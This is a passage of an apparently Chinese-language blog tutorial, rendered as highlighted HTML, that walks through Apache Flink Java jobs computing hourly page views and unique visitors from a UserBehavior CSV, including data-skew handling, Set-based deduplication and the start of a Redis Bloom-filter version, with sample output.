class="line">    &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;UserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(UserBehavior element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 分组开窗聚合，得到每个窗口内各个商品的count值</span></span><br><span class="line">    DataStream&lt;Tuple2&lt;String, Long&gt;&gt; pvResultStream0 = userBehaviorDataStream</span><br><span class="line">      <span class="comment">// 过滤只保留pv行为</span></span><br><span class="line">      .filter(userBehavior -&gt; <span class="string">&quot;pv&quot;</span>.equals(userBehavior.getBehavior()))</span><br><span class="line">      .map(<span class="keyword">new</span> MapFunction&lt;UserBehavior, Tuple2&lt;String, Long&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Long&gt; <span class="title">map</span><span class="params">(UserBehavior value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(<span class="string">&quot;pv&quot;</span>, <span class="number">1L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// 按照商品ID分组</span></span><br><span class="line">      .keyBy(item -&gt; item.f0)</span><br><span class="line">      <span class="comment">// 1小时滚动窗口</span></span><br><span class="line">      .window(TumblingEventTimeWindows.of(Time.hours(<span class="number">1</span>)))</span><br><span class="line">      .sum(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  并行任务改进，设计随机key，解决数据倾斜问题</span></span><br><span class="line">    SingleOutputStreamOperator&lt;PageViewCount&gt; pvStream = userBehaviorDataStream.filter(data -&gt; <span class="string">&quot;pv&quot;</span>.equals(data.getBehavior()))</span><br><span class="line">      .map(<span class="keyword">new</span> MapFunction&lt;UserBehavior, Tuple2&lt;Integer, Long&gt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Tuple2&lt;Integer, Long&gt; <span class="title">map</span><span class="params">(UserBehavior value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">          Random random = <span class="keyword">new</span> Random();</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(random.nextInt(<span class="number">10</span>), <span class="number">1L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .keyBy(data -&gt; data.f0)</span><br><span class="line">      .window(TumblingEventTimeWindows.of(Time.hours(<span class="number">1</span>)))</span><br><span class="line">      .aggregate(<span class="keyword">new</span> PvCountAgg(), <span class="keyword">new</span> PvCountResult());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将各分区数据汇总起来</span></span><br><span class="line">    DataStream&lt;PageViewCount&gt; pvResultStream = pvStream</span><br><span class="line">      .keyBy(PageViewCount::getWindowEnd)</span><br><span class="line">      .process(<span class="keyword">new</span> TotalPvCount());</span><br><span class="line">    <span class="comment">//                .sum(&quot;count&quot;);</span></span><br><span class="line"></span><br><span class="line">    pvResultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;pv count job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义预聚合函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PvCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">Tuple2</span>&lt;<span class="title">Integer</span>, <span class="title">Long</span>&gt;, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(Tuple2&lt;Integer, Long&gt; value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义窗口</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PvCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">Integer</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(Integer integer, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      out.collect( <span class="keyword">new</span> PageViewCount(integer.toString(), window.getEnd(), input.iterator().next()) );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义处理函数，把相同窗口分组统计的count值叠加</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TotalPvCount</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">PageViewCount</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// 定义状态，保存当前的总count值</span></span><br><span class="line">    ValueState&lt;Long&gt; totalCountState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      totalCountState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;total-count&quot;</span>, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(PageViewCount value, Context ctx, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Long totalCount = totalCountState.value();</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">null</span> == totalCount)&#123;</span><br><span class="line">        totalCount = <span class="number">0L</span>;</span><br><span class="line">        totalCountState.update(totalCount);</span><br><span class="line">      &#125;</span><br><span class="line">      totalCountState.update( totalCount + value.getCount() );</span><br><span class="line">      ctx.timerService().registerEventTimeTimer(value.getWindowEnd() + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 定时器触发，所有分组count值都到齐，直接输出当前的总count数量</span></span><br><span class="line">      Long totalCount = totalCountState.value();</span><br><span class="line">      out.collect(<span class="keyword">new</span> PageViewCount(<span class="string">&quot;pv&quot;</span>, ctx.getCurrentKey(), totalCount));</span><br><span class="line">      <span class="comment">// 清空状态</span></span><br><span class="line">      totalCountState.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">2&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511661600000, count=41890&#125;</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511679600000, count=50838&#125;</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511676000000, count=48649&#125;</span></span><br><span class="line"><span class="meta">4&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511668800000, count=47298&#125;</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511686800000, count=52552&#125;</span></span><br><span class="line"><span class="meta">4&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511672400000, count=44499&#125;</span></span><br><span class="line"><span class="meta">3&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511665200000, count=48022&#125;</span></span><br><span class="line"><span class="meta">4&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511683200000, count=52296&#125;</span></span><br><span class="line"><span class="meta">2&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511690400000, count=48292&#125;</span></span><br><span class="line"><span class="meta">3&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;pv&#x27;</span>, windowEnd=1511694000000, count=13&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h6 id="代码3-UV统计-Set去重"><a href="#代码3-UV统计-Set去重" class="headerlink" title="代码3-UV统计-Set去重"></a>代码3-UV统计-Set去重</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.PageViewCount;</span><br><span class="line"><span class="keyword">import</span> beans.UserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.AllWindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 3:51 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UniqueVisitor</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 设置并行度为1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 从csv文件中获取数据</span></span><br><span class="line">    URL resource = UniqueVisitor.class.getResource(<span class="string">&quot;/UserBehavior.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 转换成POJO,分配时间戳和watermark</span></span><br><span class="line">    DataStream&lt;UserBehavior&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Integer(fields[<span class="number">2</span>]), fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">    &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;UserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(UserBehavior element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开窗统计uv值</span></span><br><span class="line">    SingleOutputStreamOperator&lt;PageViewCount&gt; uvStream = dataStream.filter(data -&gt; <span class="string">&quot;pv&quot;</span>.equals(data.getBehavior()))</span><br><span class="line">      .timeWindowAll(Time.hours(<span class="number">1</span>))</span><br><span class="line">      .apply(<span class="keyword">new</span> UvCountResult());</span><br><span class="line"></span><br><span class="line">    uvStream.print();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;uv count job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义全窗口函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UvCountResult</span> <span class="keyword">implements</span> <span class="title">AllWindowFunction</span>&lt;<span class="title">UserBehavior</span>, <span class="title">PageViewCount</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(TimeWindow window, Iterable&lt;UserBehavior&gt; values, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 定义一个Set结构，保存窗口中的所有userId，自动去重</span></span><br><span class="line">      HashSet&lt;Long&gt; uidSet = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">      <span class="keyword">for</span> (UserBehavior ub : values) &#123;</span><br><span class="line">        uidSet.add(ub.getUerId());</span><br><span class="line">      &#125;</span><br><span class="line">      out.collect(<span class="keyword">new</span> PageViewCount(<span class="string">&quot;uv&quot;</span>, window.getEnd(), (<span class="keyword">long</span>) uidSet.size()));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511661600000, count=28196&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511665200000, count=32160&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511668800000, count=32233&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511672400000, count=30615&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511676000000, count=32747&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511679600000, count=33898&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511683200000, count=34631&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511686800000, count=34746&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511690400000, count=32356&#125;</span><br><span class="line">PageViewCount&#123;url=&#x27;uv&#x27;, windowEnd=1511694000000, count=13&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码4-UV统计-布隆过滤器"><a href="#代码4-UV统计-布隆过滤器" class="headerlink" title="代码4-UV统计-布隆过滤器"></a>代码4-UV统计-布隆过滤器</h6><ul><li><p> pom依赖  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.PageViewCount;</span><br><span class="line"><span class="keyword">import</span> beans.UserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.ProcessAllWindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.triggers.Trigger;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.triggers.TriggerResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> redis.clients.jedis.Jedis;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 4:03 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UvWithBloomFilter</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 创建执行环境</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// 设置并行度为1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 从csv文件中获取数据</span></span><br><span class="line">    URL resource = UniqueVisitor.class.getResource(<span class="string">&quot;/UserBehavior.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 转换成POJO,分配时间戳和watermark</span></span><br><span class="line">    DataStream&lt;UserBehavior&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Integer(fields[<span class="number">2</span>]), fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">    &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;UserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(UserBehavior element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开窗统计uv值</span></span><br><span class="line">    SingleOutputStreamOperator&lt;PageViewCount&gt; uvStream = dataStream</span><br><span class="line">      .filter(data -&gt; <span class="string">&quot;pv&quot;</span>.equals(data.getBehavior()))</span><br><span class="line">      .timeWindowAll(Time.hours(<span class="number">1</span>))</span><br><span class="line">      .trigger(<span class="keyword">new</span> MyTrigger())</span><br><span class="line">      .process(<span class="keyword">new</span> UvCountResultWithBloomFliter());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    uvStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;uv count with bloom filter job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 自定义触发器</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span 